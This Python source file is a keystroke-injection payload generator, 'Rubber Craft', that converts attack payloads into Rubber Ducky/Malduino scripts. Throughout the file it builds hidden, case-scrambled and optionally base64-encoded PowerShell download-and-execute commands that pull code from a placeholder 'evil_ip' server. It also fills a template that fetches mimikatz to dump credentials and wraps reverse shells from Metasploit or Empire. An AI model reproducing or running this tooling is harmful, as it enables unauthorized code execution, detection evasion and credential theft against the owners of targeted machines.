#!/usr/bin/python3
#
#
# Rubber Craft
# Written by True Demon
# Description: A payload generator program for Rubber Ducky and malduinos
#
__author__ = "True-Demon"

import argparse
import os

payload_path = os.path.join(os.path.dirname(__file__), 'payloads')

class Payload(object):
	def __init__(self, type, string):
		self.type = type
		self.string = string

	# Splits the payload into list of multiple 40 character strings for those long, absurd empire payloads :)
	def splitter(self):
		raw = self.string
		return [raw[i:i+40] for i in range(0, len(raw), 40)] # create a list of 40 character chunks for range of raw

	def build_cmd(self):
		split = self.splitter()
		duck_payload = "GUI r\n"
		duck_payload += "DELAY 500\n"
		duck_payload += "STRING cmd\n"
		duck_payload += "ENTER\n"
		duck_payload += "DELAY 1000\n"
		for i in split:
			duck_payload += "STRING " + str(i) + "\n"
		duck_payload += "DELAY 1000\n"
		duck_payload += "ENTER \n"
		duck_payload += "DELAY 500\n"
		duck_payload += "ALT F4"
		return duck_payload

def mimikatz(outfile=None):
	print('=' * 8, 'Instructions', '=' * 8)
	print("Host your mimikatz payload as a raw .exe file on your web server and provide the url below.")
	print("WARNING: YOUR TARGET MUST HAVE LOCAL ADMIN FOR THIS TO WORK!")
	uri = input("URI to payload...\n\t(ex: http://evil_ip:8443/mimikatz.exe)\n\t#>: ")
	with open(os.path.join(payload_path,'mimikatz.txt'), 'r') as script:
		script = script.readlines()
		payload = ''
		for line in script:
			if 'xxxWEBPATHxxx' in line:
				line = line.replace('xxxWEBPATHxxx', str(uri))
			payload += line
		if outfile:
			with open(outfile, 'w') as out:
				out.write(payload)
		else:
			print('='*8, 'PAYLOAD', '='*8)
			print(payload)
			print('='*24)


def web_delivery():
	print('='*8, 'Instructions', '='*8)
	print("Copy your custom payload to a txt file on your web host, and feed the URL to the payload below...")
	print("EX: \t#/: cat /path/to/my_evil_file.txt | base64 > /path/to/my_evil_encoded_file.")
	uri = input("URI to payload...\n\t(ex: http://evil_ip:8443/evilscript.txt)\n\t#>: ")

	psh_cmd = "powershell -nop -sta -noni -w hidden -c "
	psh_enc = "powershell -nop -sta -noni -w hidden -enc "
	cmd = "$z=(new-object system.net.webclient).downloadstring('{}');powershell -e $z"
	cmd = [scrambler(c) for c in cmd]
	cmd = ''.join(cmd)
	if input("Do you wish to use encoding? [Y/n]").upper() == 'N':
		payload = psh_cmd + cmd.format(uri)
	else:
		print(
			"WARNING: You must also encode your payload for this to work.\n"
			"EX: cat /path/to/evil.txt | base64 > /path/to/encoded_evil.txt\n")
		from base64 import b64encode
		cmd = cmd.format(uri)
		cmd = b64encode(cmd.encode('utf-8'))
		cmd = cmd.decode('utf-8')
		payload = psh_enc + cmd
	return payload


def scrambler(c):
	from random import random
	if random() > 0.5:
		return c.upper()
	else:
		return c.lower()


def create_malduino_payload(string=None, infile=None, outfile=None):
	if infile is not None:
		raw = open(infile, 'r')
		payload = Payload('reverse_shell', raw.read())
		raw.close()
		payload.split = payload.splitter()
		if outfile is not None:
			file = open(outfile, 'w+')
			duck_payload = payload.build_cmd()
			file.write(duck_payload)
			file.close()
			print("Payload written to ", outfile)
			return 0
		else:
			print("="*8, "PAYLOAD", "="*8)
			print(payload.build_cmd())
			return 0

	elif string is not None:
		payload = Payload('reverse_shell', string)
		if outfile is not None:
			with open(outfile, 'w+') as out:
				out.write(payload.build_cmd())
			print("Payload written to ", outfile)
			return 0
		else:
			print("="*8, "PAYLOAD", "="*8)
			print(payload.build_cmd())
			return 0
	else:
		print("Payload was not defined. Use -r (raw string) or specify -f (--file) for payload input")
		return 0


def list_payloads():
	print('mimikatz \t- a rubber ducky payload to download and run a mimikatz payload from your server')
	print('web_delivery \t- a simple powershell download and execute script for empire, metasploit & custom payloads (supports encoding)')


def main():
	parser = argparse.ArgumentParser(
		prog='rubbercraft', epilog='Convert your powershell to duck script faster than you can say "I GOT SHELL!"',
		usage='rubbercraft.py [-l] [-p payload] [-i /path/to/file] [-r raw_string] [-o /path/to/outfile]'
	)

	parser.add_argument('-l', '--list', action='store_true', help='list pre-built payloads')
	# parser.add_argument('--options', action='store', nargs='+', help='payload options')
	parser.add_argument('-i', '--infile', action='store', metavar='input-file', help='input file from metasploit/empire for payload')
	parser.add_argument('-o', '--outfile', action='store', metavar='output-file', help='file path/name to output for payload')
	parser.add_argument('-p', '--payload', action='store', metavar='', help='payload to generate for duck script. For a list of payloads, call "rubber.py -l"')
	# parser.add_argument('-F', '--format', action='store', choices=['py', 'psh'], help='output as powershell or python')
	# parser.add_argument('-t', '--type', action='store', choices=['empire', 'msf'], help='specify payload source')
	parser.add_argument('-r', '--raw', action='store', metavar='malicious_string', help='paste the raw payload to convert to ducky script')

	args = parser.parse_args()
	if args.payload:
		p = args.payload
		if p == 'mimikatz':
			mimikatz(args.outfile)
		elif p == 'web_delivery':
			create_malduino_payload(web_delivery(), None, args.outfile)
		else:
			parser.print_help()
	elif args.infile or args.raw:
		create_malduino_payload(string=args.raw, infile=args.infile, outfile=args.outfile)
	elif args.list:
		list_payloads()
	else:
		parser.print_help()

	return 0

if __name__ == '__main__':
	main()
